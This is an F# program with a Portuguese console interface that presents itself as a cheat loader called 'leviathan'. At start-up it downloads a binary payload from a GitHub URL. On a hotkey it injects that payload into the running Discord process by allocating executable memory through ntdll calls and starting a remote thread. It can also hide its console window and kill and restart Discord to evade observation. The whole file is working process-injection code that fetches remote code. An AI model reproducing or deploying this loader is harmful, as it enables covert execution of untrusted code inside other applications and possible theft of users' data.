open System
open System.Runtime.InteropServices
open System.Diagnostics
open System.Threading
open System.Net
open System.Net.Http

let PROCESS_ALL_ACCESS = 0x1FFFFFu
let MEM_COMMIT = 0x1000u
let MEM_RESERVE = 0x2000u
let MEM_RELEASE = 0x8000u
let PAGE_READWRITE = 0x04u
let PAGE_EXECUTE_READWRITE = 0x40u
let VK_SHIFT = 0x10
let VK_F1 = 0x70
let VK_F2 = 0x71
let VK_F3 = 0x72
let VK_F4 = 0x73
let VK_F5 = 0x74
let VK_ESC = 0x1B

[<DllImport("kernel32.dll")>] extern IntPtr OpenProcess(uint32, bool, uint32)
[<DllImport("kernel32.dll")>] extern bool CloseHandle(IntPtr)
[<DllImport("kernel32.dll")>] extern IntPtr CreateRemoteThread(IntPtr, IntPtr, uint32, IntPtr, IntPtr, uint32, IntPtr)
[<DllImport("kernel32.dll")>] extern IntPtr OpenThread(uint32, bool, uint32)
[<DllImport("kernel32.dll")>] extern uint32 SuspendThread(IntPtr)
[<DllImport("kernel32.dll")>] extern bool TerminateThread(IntPtr, uint32)
[<DllImport("kernel32.dll")>] extern uint32 WaitForSingleObject(IntPtr, uint32)
[<DllImport("kernel32.dll")>] extern bool GetExitCodeThread(IntPtr, uint32&)
[<DllImport("ntdll.dll")>] extern int NtAllocateVirtualMemory(IntPtr, IntPtr&, UIntPtr, uint32&, uint32, uint32)
[<DllImport("ntdll.dll")>] extern int NtWriteVirtualMemory(IntPtr, IntPtr, byte[], uint32, uint32&)
[<DllImport("ntdll.dll")>] extern int NtProtectVirtualMemory(IntPtr, IntPtr&, uint32&, uint32, uint32&)
[<DllImport("ntdll.dll")>] extern int NtFreeVirtualMemory(IntPtr, IntPtr&, uint32&, uint32)
[<DllImport("user32.dll")>] extern int16 GetAsyncKeyState(int)
[<DllImport("user32.dll")>] extern bool ShowWindow(IntPtr, int)
[<DllImport("kernel32.dll")>] extern IntPtr GetConsoleWindow()
[<DllImport("kernel32.dll")>] extern bool SetConsoleTitle(string)

let Download (url: string) =
    let u = url.Replace("/blob/", "/raw/refs/heads/")
    use h = new HttpClientHandler(UseProxy = false)
    use c = new HttpClient(h, Timeout = TimeSpan.FromSeconds(120.0))
    c.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
    c.GetByteArrayAsync(u).Result

let mutable hp = IntPtr.Zero
let mutable ht = IntPtr.Zero
let mutable a = IntPtr.Zero
let mutable sc : byte[] = null
let mutable vis = true
let mutable injected = false
let mutable injecting = false

SetConsoleTitle("") |> ignore
Console.Clear()
Console.BackgroundColor <- ConsoleColor.Black
Console.ForegroundColor <- ConsoleColor.DarkGray
Console.Clear()
Console.CursorVisible <- false

let rng = Random()

// Mar na parte inferior
let seaTop = Console.WindowHeight - 4
let seaChars = [| "~"; "≈"; "≋"; "∿"; "∼"; "⁓"; "〜"; "〰"; "▁"; "▂"; "▃"; "▄" |]
let seaWaves = Array.init Console.WindowWidth (fun _ -> rng.Next(0, 3))

let seaEffect () =
    async {
        while true do
            for x in 0 .. Console.WindowWidth - 1 do
                let y = seaTop + seaWaves.[x]
                if y >= 0 && y < Console.WindowHeight then
                    try Console.SetCursorPosition(x, y); Console.Write(' ') with _ -> ()
                seaWaves.[x] <- seaWaves.[x] + (if rng.Next(3) = 0 then -1 else 1)
                if seaWaves.[x] < 0 then seaWaves.[x] <- 0
                if seaWaves.[x] > 3 then seaWaves.[x] <- 3
                let newY = seaTop + seaWaves.[x]
                if newY >= 0 && newY < Console.WindowHeight then
                    try
                        Console.SetCursorPosition(x, newY)
                        Console.ForegroundColor <- ConsoleColor.DarkBlue
                        Console.Write(seaChars.[rng.Next(seaChars.Length)])
                    with _ -> ()
            do! Async.Sleep(200)
    }

Async.Start(seaEffect())

// UI - menu à esquerda, logs à direita
let logX = Console.WindowWidth - 30
let logY = 4
let mutable logs = Array.create 6 ""

Console.ForegroundColor <- ConsoleColor.Cyan
Console.SetCursorPosition(2, 2); Console.Write("l e v i a t h a n")
Console.SetCursorPosition(2, 3); Console.Write("nunca use o unload do cheat")
Console.ForegroundColor <- ConsoleColor.DarkGray
Console.SetCursorPosition(2, 5); Console.Write("[ SHIFT + F1 ]  injetar")
Console.SetCursorPosition(2, 6); Console.Write("[ SHIFT + F2 ]  so quando for telado + reinicia o dc")
Console.SetCursorPosition(2, 7); Console.Write("[ SHIFT + F3 ]  unload no cheat")
Console.SetCursorPosition(2, 8); Console.Write("[ SHIFT + F4 ]  mostrar cmd")
Console.SetCursorPosition(2, 9); Console.Write("[ SHIFT + F5 ]  esconder o cmd")
Console.ForegroundColor <- ConsoleColor.DarkGray
Console.SetCursorPosition(2, 12); Console.Write("─".PadRight(Console.WindowWidth - 4, '─'))

// Painel de log à direita
Console.SetCursorPosition(logX, 3); Console.ForegroundColor <- ConsoleColor.Cyan; Console.Write("console")
Console.SetCursorPosition(logX, 4); Console.ForegroundColor <- ConsoleColor.DarkGray; Console.Write("─".PadRight(28, '─'))

let log (msg: string) =
    for i in 0..4 do logs.[i] <- logs.[i+1]
    logs.[5] <- msg
    for i in 0..5 do
        try Console.SetCursorPosition(logX, logY + i); Console.Write(" │ " + logs.[i].PadRight(24)) with _ -> ()

log "ready"

sc <- Download "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/xereca.bin"

let freeMemory () =
    if a <> IntPtr.Zero && hp <> IntPtr.Zero then
        let mutable fa = a
        let mutable fs = uint32(sc.Length)
        NtFreeVirtualMemory(hp, &fa, &fs, MEM_RELEASE) |> ignore
    a <- IntPtr.Zero

let freeAll () =
    try
        if ht <> IntPtr.Zero then SuspendThread(ht) |> ignore; TerminateThread(ht, 0u) |> ignore; CloseHandle(ht) |> ignore; ht <- IntPtr.Zero
        freeMemory()
        if hp <> IntPtr.Zero then CloseHandle(hp) |> ignore; hp <- IntPtr.Zero
        injected <- false; injecting <- false
    with _ -> ()

let Inject () =
    if injecting then log "injection in progress..."; false
    elif injected then log "already injected"; false
    else
        injecting <- true
        log "waiting 5s..."
        Thread.Sleep(5000)
        try
            let procs = Process.GetProcessesByName("Discord")
            if procs.Length = 0 then log "discord not found"; injecting <- false; false
            else
                let pid = uint32(procs.[0].Id)
                hp <- OpenProcess(PROCESS_ALL_ACCESS, false, pid)
                if hp = IntPtr.Zero then log "run as admin"; injecting <- false; false
                else
                    let mutable addr = IntPtr.Zero
                    let mutable size = uint32(sc.Length + 0x1000)
                    let allocResult = NtAllocateVirtualMemory(hp, &addr, UIntPtr.Zero, &size, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
                    if allocResult <> 0 then log "alloc failed"; CloseHandle(hp) |> ignore; hp <- IntPtr.Zero; injecting <- false; false
                    else
                        a <- addr
                        let mutable off = 0
                        let mutable ok = true
                        while off < sc.Length && ok do
                            let sz = min 512 (sc.Length - off)
                            let ck = Array.zeroCreate<byte> sz
                            Array.Copy(sc, off, ck, 0, sz)
                            let mutable w = 0u
                            if NtWriteVirtualMemory(hp, IntPtr(a.ToInt64() + int64(off)), ck, uint32(sz), &w) <> 0 then ok <- false
                            off <- off + sz
                        if not ok then log "write failed"; freeAll(); false
                        else
                            let mutable pa = a
                            let mutable ps = uint32(sc.Length)
                            let mutable op = 0u
                            NtProtectVirtualMemory(hp, &pa, &ps, PAGE_EXECUTE_READWRITE, &op) |> ignore
                            ht <- CreateRemoteThread(hp, IntPtr.Zero, 0u, a, IntPtr.Zero, 0u, IntPtr.Zero)
                            if ht = IntPtr.Zero then log "thread failed"; freeAll(); false
                            elif WaitForSingleObject(ht, 2000u) = 0u then log "crash detected"; freeAll(); false
                            else injected <- true; injecting <- false; log "injected"
                                 Thread.Sleep(5000); log "done"; true
        with _ -> log "error"; freeAll(); false

let Telado () =
    log "closing dc..."
    freeAll()
    for p in Process.GetProcessesByName("Discord") do try p.Kill() with _ -> ()
    Thread.Sleep(2500)
    try Process.Start(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord", "Update.exe"), "--processStart Discord.exe") |> ignore; log "restarted" with _ -> log "restart failed"

let Unload () = try freeAll(); log "unloaded" with _ -> log "unload failed"

let mutable on = true
while on do
    Thread.Sleep(50)
    let s = GetAsyncKeyState(VK_SHIFT) &&& 0x8000s <> 0s
    let f1 = GetAsyncKeyState(VK_F1) &&& 0x8000s <> 0s
    let f2 = GetAsyncKeyState(VK_F2) &&& 0x8000s <> 0s
    let f3 = GetAsyncKeyState(VK_F3) &&& 0x8000s <> 0s
    let f4 = GetAsyncKeyState(VK_F4) &&& 0x8000s <> 0s
    let f5 = GetAsyncKeyState(VK_F5) &&& 0x8000s <> 0s
    let esc = GetAsyncKeyState(VK_ESC) &&& 0x8000s <> 0s
    if s && f1 then Inject() |> ignore
    elif s && f2 then Telado()
    elif s && f3 && injected then Unload()
    elif s && f4 && not vis then ShowWindow(GetConsoleWindow(), 5) |> ignore; vis <- true
    elif s && f5 && vis then ShowWindow(GetConsoleWindow(), 0) |> ignore; vis <- false
    elif s && esc then if injected then Unload(); on <- false
;;